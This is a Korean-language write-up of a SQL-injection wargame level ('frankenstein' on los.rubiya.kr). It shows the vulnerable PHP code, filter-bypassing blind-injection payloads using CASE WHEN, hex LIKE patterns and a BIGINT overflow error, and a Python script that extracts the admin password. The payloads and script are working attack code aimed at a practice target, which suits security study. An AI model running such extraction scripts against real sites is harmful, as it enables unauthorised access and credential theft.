# frankenstein

## 1. Code
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(|\)|union/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id,pw from prob_frankenstein where id='frankenstein' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(mysqli_error($db)) exit("error");

  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_frankenstein where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("frankenstein");
  highlight_file(__FILE__);
?>
```

## 2. Condition
- `prob _ . ( ) union`등을 필터링 한다.   
- 쿼리 에러 발생시, "error"를 화면에 표시한다.   
- 정확한 admin pw 값을 찾아내면 문제가 해결된다.   

## 3. Solution
blind sqlinjection 진행을 위해 error 발생 부분을 참거짓 구분으로 활용하였다.   
괄호가 필터링 되어, if문 사용에 제약이 있으므로 새롭게 case when 구문을 활용하였다.   

```sql
CASE WHEN 조건식 THEN 반환값 ELSE 조건에 만족하지 않을 경우 반환값 END
```   



조건문속 admin pw의 길이, 값을 구하는데 사용해왔던 `length substr ascii`등이 괄호 필터링에 의해   
활용이 어려워져 `like`를 이용하여 찾아보았다.    
>    `like`구문속 '_'가 필터링 되므로, hex값 변환 후 비교하였다.   
    pw값을 찾는 부분에서는 `like binary`를 사용하여 대소문자를 구분하였다.   



또한, 조건에 만족하지 않을 경우 반환값에 에러를 발생시키기 위해 `out of range` error 를 이용하였다.   
>    자세히 설명하자면, mysql 에서는 '~0'(bitwise negation to 0) 실행 시 unsigned BIGINT의 최댓값이 나온다.   
    위 경우에 1을 더하면 BIGINT overflow error가 발생하게 된다.   
>
>    일전에 'bigint overflow error based sqli' 공부하다 찾게된 내용이다.   
    참고 : https://www.exploit-db.com/docs/english/37733-bigint-overflow-error-based-sql-injection.pdf   




공격 쿼리를 구체화 하면 다음과 같다.   

```sql
length of admin pw ('_'*?)
CASE WHEN pw like 0x5f THEN 1 ELSE 1+~0 end#
CASE WHEN pw like 0x5f5f THEN 1 ELSE 1+~0 end#
CASE WHEN pw like 0x5f5f5f THEN 1 ELSE 1+~0 end#

value of admin pw ('?%')
CASE WHEN pw like binary 0x6125 THEN 1 ELSE 1+~0 end#
CASE WHEN pw like binary 0x616225 THEN 1 ELSE 1+~0 end#
CASE WHEN pw like binary 0x616325 THEN 1 ELSE 1+~0 end#
CASE WHEN pw like binary 0x61636125 THEN 1 ELSE 1+~0 end#
```   



위를 구성으로 짜본 python script는 다음과 같다.   
```python
import requests
import binascii

cookie = {'PHPSESSID' : '~~~~'}
    
def str2hex(string_1):
    return binascii.hexlify(string_1.encode('utf-8')).decode('utf-8')

for i in range(1,100):
    url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?\
        pw=' or id='admin' and case when pw like 0x%s then 1 else 1%%2b~0 end%%23;" % (str2hex('_'*i))
    res = requests.get(url, cookies=cookie)
    print("%d ... " % i, end="")
    
    if not "<hr><br>error" in res.text:
        pw_len = i
        print("O")
        print("\n======================")
        print("admin pw length  |  %d" % pw_len)
        print("======================\n")
        break
    
    else:
        print("X")
        

pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        tmp_str = pw_value + chr(j) + '%'
        url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?\
            pw=' or id='admin' and case when pw like binary 0x%s then 1 else 1%%2b~0 end%%23;" % (str2hex(tmp_str))
        res = requests.get(url, cookies=cookie)

        if not("<hr><br>error" in res.text) and (chr(j) != '%') and (chr(j) != '_'):
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break
            

print("\n======================")
print("admin pw  |  %s" % pw_value)
print("======================\n")
```   


결과는 다음과 같다.   
```
1 ... X
2 ... X
3 ... X
4 ... X
5 ... X
6 ... X
7 ... X
8 ... O

======================
admin pw length  |  8
======================

pw(1) : 0
pw(2) : 0d
pw(3) : 0dc
pw(4) : 0dc4
pw(5) : 0dc4e
pw(6) : 0dc4ef
pw(7) : 0dc4efb
pw(8) : 0dc4efbb

======================
admin pw  |  0dc4efbb
======================

```   

최종적으로 위 값을 `pw`로 넣어주면 문제가 해결된다.   

변수명 | 값
---|---
`pw` | 0dc4efbb